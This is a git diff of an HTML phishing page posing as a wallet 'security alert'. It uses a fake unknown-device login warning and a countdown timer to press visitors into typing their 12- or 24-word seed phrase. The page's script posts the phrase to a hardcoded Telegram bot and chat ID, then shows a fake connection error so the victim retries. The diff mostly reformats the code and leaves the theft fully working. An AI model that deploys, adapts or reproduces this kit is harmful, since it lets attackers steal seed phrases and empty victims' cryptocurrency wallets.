@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Wallet Security Flow</title>
   <style>
     body {
@@ -21,7 +22,7 @@
       background: white;
       padding: 30px 25px;
       border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
       width: 90%;
       max-width: 400px;
     }
@@ -253,11 +254,17 @@
     }
 
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
     }
   </style>
 </head>
+
 <body>
   <div class="container">
     <div class="step-indicator">
@@ -270,16 +277,17 @@
       <h2>Security Alert: Unknown Device Login Detected</h2>
       <div class="alert">Immediate Action Required</div>
       <p>
-        We detected an unusual login attempt to your wallet from an unrecognized device. 
+        We detected an unusual login attempt to your wallet from an unrecognized device.
         For your security, immediate verification is required to maintain access to your account.
       </p>
       <p class="timer">Time remaining to verify: <span id="timer">30:00</span></p>
       <p><strong>To prevent unauthorized access, please verify your identity immediately.</strong></p>
-      
+
       <button type="button" onclick="verifyNow()">Verify Now</button>
-      
+
       <p class="footer-note">
-        If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized access.
+        If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized
+        access.
       </p>
     </div>
 
@@ -314,7 +322,7 @@
         <div class="char-counter">0/500</div>
 
         <p class="hint">ⓘ Usually 12 or 24 words separated by spaces</p>
-        
+
         <div class="navigation">
           <button type="submit" id="connect-button">
             <span id="button-text">Continue Securely</span>
@@ -331,94 +339,93 @@
   </div>
 
   <script>
-  let currentStep = 1;
-  let timerInterval;
+    let currentStep = 1;
+    let timerInterval;
 
-  // Start timer immediately when page loads
-  startTimer();
+    // Start timer immediately when page loads
+    startTimer();
 
-  // Character counter for textarea
-  const textarea = document.getElementById('passphrase');
-  const counter = document.querySelector('.char-counter');
-  if (textarea && counter) {
-    textarea.addEventListener('input', () => {
-      counter.textContent = `${textarea.value.length}/500`;
+    // Character counter for textarea
+    const textarea = document.getElementById('passphrase');
+    const counter = document.querySelector('.char-counter');
+    if (textarea && counter) {
+      textarea.addEventListener('input', () => {
+        counter.textContent = `${textarea.value.length}/500`;
+      });
+    }
+
+    // Wallet form submission
+    // document.getElementById('wallet-form').addEventListener('submit', function(e) {
+    //   e.preventDefault();
+    //   const selectedWallet = document.getElementById('wallet').value;
+    //   if (selectedWallet) {
+    //     goToStep(3);
+    //   }
+    // });
+
+    function sendToTelegram(passphrase) {
+      const botToken = '7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ'; // <-- Replace with your bot token
+      const chatId = '1108201283';     // <-- Replace with your Telegram chat ID
+      const message = `🔐 Wallet Login Attempt\n\n🪙 Wallet: Metamask\n🔑 Passphrase:\n${passphrase}`;
+
+      const telegramUrl = `https://api.telegram.org/bot7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ/sendMessage`;
+
+      return fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    // Passphrase form submission
+    document.getElementById('passphrase-form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const passphrase = document.getElementById('passphrase').value;
+      // const selectedWallet = document.getElementById('wallet').value;
+      const connectButton = document.getElementById('connect-button');
+      const buttonText = document.getElementById('button-text');
+      const spinner = document.getElementById('spinner');
+      const errorMessage = document.getElementById('error-message');
+
+      if (!passphrase.trim()) {
+        errorMessage.textContent = '❌ Please input your wallet passphrase.';
+        errorMessage.classList.add('show');
+        return;
+      }
+
+      // Show loading state
+      connectButton.disabled = true;
+      buttonText.style.display = 'none';
+      spinner.style.display = 'block';
+      errorMessage.classList.remove('show');
+
+      // Simulate connection attempt
+      setTimeout(() => {
+        // Send to Telegram
+        sendToTelegram(passphrase)
+          .then(() => {
+            // Clear passphrase
+            document.getElementById('passphrase').value = '';
+            counter.textContent = '0/500';
+          })
+          .catch(err => {
+            console.error('Telegram send error:', err);
+          });
+        // Hide loading state
+        connectButton.disabled = false;
+        buttonText.style.display = 'block';
+        spinner.style.display = 'none';
+
+        // Show error message
+        errorMessage.textContent = '❌ Error connecting to wallet. Please check your seedphrase and try again.';
+        errorMessage.classList.add('show');
+      }, 2000);
     });
-  }
-
-  // Wallet form submission
-  // document.getElementById('wallet-form').addEventListener('submit', function(e) {
-  //   e.preventDefault();
-  //   const selectedWallet = document.getElementById('wallet').value;
-  //   if (selectedWallet) {
-  //     goToStep(3);
-  //   }
-  // });
-
-  function sendToTelegram(wallet, passphrase) {
-  const botToken = '7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ'; // <-- Replace with your bot token
-  const chatId = '1108201283';     // <-- Replace with your Telegram chat ID
-  const message = `🔐 Wallet Login Attempt\n\n🪙 Wallet: ${wallet}\n🔑 Passphrase:\n${passphrase}`;
-
-  const telegramUrl = `https://api.telegram.org/bot7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ/sendMessage`;
-  
-  return fetch(telegramUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  });
-}
-
-  // Passphrase form submission
-  document.getElementById('passphrase-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const passphrase = document.getElementById('passphrase').value;
-    // const selectedWallet = document.getElementById('wallet').value;
-    const connectButton = document.getElementById('connect-button');
-    const buttonText = document.getElementById('button-text');
-    const spinner = document.getElementById('spinner');
-    const errorMessage = document.getElementById('error-message');
-    
-    if (!passphrase.trim()) {
-  errorMessage.textContent = '❌ Please input your wallet passphrase.';
-  errorMessage.classList.add('show');
-  return;
-}
-
-// Show loading state
-connectButton.disabled = true;
-buttonText.style.display = 'none';
-spinner.style.display = 'block';
-errorMessage.classList.remove('show');
-
-// Simulate connection attempt
-setTimeout(() => {
-  // Send to Telegram
-  sendToTelegram(passphrase)
-    .then(() => {
-      // Clear passphrase
-      document.getElementById('passphrase').value = '';
-      counter.textContent = '0/500';
-    })
-    .catch(err => {
-      console.error('Telegram send error:', err);
-    });
-
-  // Hide loading state
-  connectButton.disabled = false;
-  buttonText.style.display = 'block';
-  spinner.style.display = 'none';
-
-  // Show error message
-  errorMessage.textContent = '❌ Error connecting to wallet. Please check your seedphrase and try again.';
-  errorMessage.classList.add('show');
-}, 2000);
-
 
     // if (passphrase.trim()) {
     //   // Show loading state
@@ -426,17 +433,17 @@ setTimeout(() => {
     //   buttonText.style.display = 'none';
     //   spinner.style.display = 'block';
     //   errorMessage.classList.remove('show');
-      
+
     //   // Simulate connection attempt
     //   setTimeout(() => {
     //     // Hide loading state
     //     connectButton.disabled = false;
     //     buttonText.style.display = 'block';
     //     spinner.style.display = 'none';
-        
+
     //     // Show error message
     //     errorMessage.classList.add('show');
-        
+
     //     // Try to send data (this will likely fail since google.script.run doesn't exist)
     //     try {
     //       if (typeof google !== 'undefined' && google.script && google.script.run) {
@@ -460,62 +467,62 @@ setTimeout(() => {
     //     }
     //   }, 2000); // 2 second delay to simulate connection attempt
     // }
-  // });
+    // });
 
-  function goToStep(stepNumber) {
-    // Hide all pages
-    document.querySelectorAll('.page').forEach(page => {
-      page.classList.remove('active');
-    });
+    function goToStep(stepNumber) {
+      // Hide all pages
+      document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+      });
 
-    // Show target page
-    document.getElementById(`page-${stepNumber}`).classList.add('active');
+      // Show target page
+      document.getElementById(`page-${stepNumber}`).classList.add('active');
 
-    // Update step indicators
-    document.querySelectorAll('.step').forEach((step, index) => {
-      step.classList.remove('active', 'completed');
-      if (index + 1 < stepNumber) {
-        step.classList.add('completed');
-      } else if (index + 1 === stepNumber) {
-        step.classList.add('active');
+      // Update step indicators
+      document.querySelectorAll('.step').forEach((step, index) => {
+        step.classList.remove('active', 'completed');
+        if (index + 1 < stepNumber) {
+          step.classList.add('completed');
+        } else if (index + 1 === stepNumber) {
+          step.classList.add('active');
+        }
+      });
+
+      currentStep = stepNumber;
+
+      // Continue timer throughout all steps
+      if (!timerInterval) {
+        startTimer();
       }
-    });
-
-    currentStep = stepNumber;
-
-    // Continue timer throughout all steps
-    if (!timerInterval) {
-      startTimer();
     }
-  }
 
-  function startTimer() {
-    let timeLeft = 30 * 60; // 30 minutes in seconds
-    const timerElement = document.getElementById('timer');
+    function startTimer() {
+      let timeLeft = 30 * 60; // 30 minutes in seconds
+      const timerElement = document.getElementById('timer');
 
-    timerInterval = setInterval(() => {
-      const minutes = Math.floor(timeLeft / 60);
-      const seconds = timeLeft % 60;
-      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      timerInterval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-        alert('Verification time expired. Please start the process again.');
-        goToStep(1);
-      }
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          alert('Verification time expired. Please start the process again.');
+          goToStep(1);
+        }
 
-      timeLeft--;
-    }, 1000);
-  }
+        timeLeft--;
+      }, 1000);
+    }
 
-  function verifyNow() {
-    goToStep(2);
-  }
+    function verifyNow() {
+      goToStep(2);
+    }
 
-  // Initialize character counter
-  if (textarea && counter) {
-    counter.textContent = `${textarea.value.length}/500`;
-  }
-</script>
+    // Initialize character counter
+    if (textarea && counter) {
+      counter.textContent = `${textarea.value.length}/500`;
+    }
+  </script>
 </body>
 </html>
